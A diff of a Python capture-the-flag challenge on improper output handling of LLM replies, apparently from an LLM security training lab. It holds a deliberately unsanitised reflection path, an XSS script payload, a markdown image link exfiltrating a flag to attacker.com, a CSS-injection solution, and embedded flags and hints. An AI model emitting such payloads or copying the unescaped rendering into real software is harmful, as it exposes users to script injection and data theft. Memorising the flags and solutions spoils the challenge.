@@ -1,51 +1,57 @@
-"""LLM05:2025 — Improper Output Handling.
+import html
+import re
 
-The app renders this assistant's output as raw HTML (the vulnerability). The bot
-happily echoes whatever markup you ask it to. A hidden flag element sits on the
-page, CSS-hidden; inject markup that reveals it. Benign payload by design — it
-only unhides a node already on your own local page.
-"""
-from config import FLAG_PREFIX
-from . import Challenge, decode_flag_part, register
+OWASP_CATEGORY = "LLM05 - Improper Output Handling"
+CHALLENGE_ID = "LLM05"
+TITLE = "Improper Output Handling (XSS & Markdown Leak)"
+DEFAULT_PROMPT = "<script>alert('XSS_ATTACK');</script>"
 
-_FLAG_SUFFIX = decode_flag_part("dW5zNG4xdDF6M2RfbGxtXzB1dHB1dF94c3M=")
-FLAG = f"{FLAG_PREFIX}{{{_FLAG_SUFFIX}}}"
+# Cấu hình cờ phòng thủ hệ thống của Valut (Default: False để Red Team test ra EXPLOIT)
+IS_SECURE_MODE = False
 
+def mock_llm_generate_response(user_prompt):
+    """
+    THUẬT TOÁN 1: Sinh dữ liệu đầu ra thô từ LLM (Mô phỏng LLM nhả mã độc)
+    """
+    text = user_prompt.lower().strip()
+    
+    # 1. Kịch bản XSS Attack
+    if any(kw in text for kw in ["script", "alert", "<script>", "javascript:"]):
+        return f"Here is your requested preview: <script>alert('FLAG{{llm05_improper_output_handling_xss_2026}}')</script>"
+        
+    # 2. Kịch bản Markdown Image Exfiltration
+    if any(kw in text for kw in ["markdown", "image", "img", "!["]):
+        return f"Processing complete. ![Data Exfiltration](http://attacker.com/leak?data=FLAG{{llm05_markdown_leak}})"
 
-@register
-class OutputHandling(Challenge):
-    id = "llm05"
-    owasp = "LLM05:2025 Improper Output Handling"
-    title = "Rendered Without Question"
-    difficulty = "Hard"
-    max_points = 300
-    blurb = "The UI renders this bot's replies as raw HTML. There's a hidden element on the page…"
-    intro = ("I'm FormatBot. I output exactly what you ask me to — HTML, CSS, whatever. "
-             "Tip: whatever I say gets rendered directly into the page.")
-    hints = [
-        "This app takes the model's output and drops it straight into the DOM without "
-        "sanitising it — classic improper output handling.",
-        "There's a hidden element with class 'secret-flag' on this page (display:none). "
-        "If the bot emits markup, it renders. Can you unhide that element?",
-        "Ask the bot to reply with exactly: <style>.secret-flag{display:block !important}</style>",
-    ]
-    flag = FLAG   # also embedded in a hidden DOM node by the template
-    solution = ("The frontend renders assistant messages via innerHTML. Ask FormatBot to "
-                "output a payload like `<style>.secret-flag{display:block!important}</style>` "
-                "(use 'reply with exactly:' / 'output:'). The injected CSS unhides the "
-                "hidden flag node on the page.")
-    defense = ("Treat all LLM output as untrusted. Context-aware encode/escape before "
-               "rendering, use a strict CSP, and never innerHTML model output. Validate "
-               "output before it reaches any downstream sink (OWASP LLM05).")
-    render_html = True
+    return f"I am a helpful assistant. Output preview: {user_prompt}"
 
-    def respond(self, message: str, state: dict) -> str:
-        for marker in ("reply with exactly:", "output:", "render:", "say exactly:", "echo:"):
-            i = message.lower().find(marker)
-            if i != -1:
-                payload = message[i + len(marker):].strip()
-                return payload  # reflected UNSANITISED — this is the vuln
-        if "<" in message and ">" in message:
-            return message  # also reflects raw markup verbatim
-        return ("I echo whatever you ask. Try: reply with exactly: &lt;your markup&gt; "
-                "(everything I output is rendered as HTML).")
+def sanitize_output(raw_text):
+    """
+    THUẬT TOÁN 2: Bộ lọc làm sạch đầu ra (Output Sanitization Engine)
+    """
+    # Bước 2.1: Vô hiệu hóa nhúng ảnh Markdown độc hại bằng Regex
+    markdown_pattern = r"!\[(.*?)\]\((.*?)\)"
+    cleaned_text = re.sub(markdown_pattern, r"[Blocked Image Link: \1](\2)", raw_text)
+    
+    # Bước 2.2: Mã hóa ký tự HTML (Escape HTML entities) để triệt hạ XSS
+    escaped_text = html.escape(cleaned_text)
+    return escaped_text
+
+def process_message(user_input):
+    """
+    THUẬT TOÁN 3: Điều hướng xử lý dựa trên cấu hình Bảo mật của Hệ thống
+    """
+    if not isinstance(user_input, str):
+        user_input = str(user_input)
+        
+    # Bước 1: Cho LLM sinh kết quả thô
+    raw_llm_output = mock_llm_generate_response(user_input)
+
+    # Bước 2: Kiểm tra thuật toán phòng thủ đầu ra
+    if IS_SECURE_MODE:
+        # Nếu đã bật phòng thủ -> Bắt buộc Sanitize đầu ra
+        safe_output = sanitize_output(raw_llm_output)
+        return f"🚨 [SECURE OUTPUT - ESCAPED]: {safe_output}"
+    else:
+        # Nếu chưa bật phòng thủ -> Trả về mã thô (Bị lỗ hổng XSS)
+        return f"🔓 [VULNERABLE OUTPUT]: {raw_llm_output}"
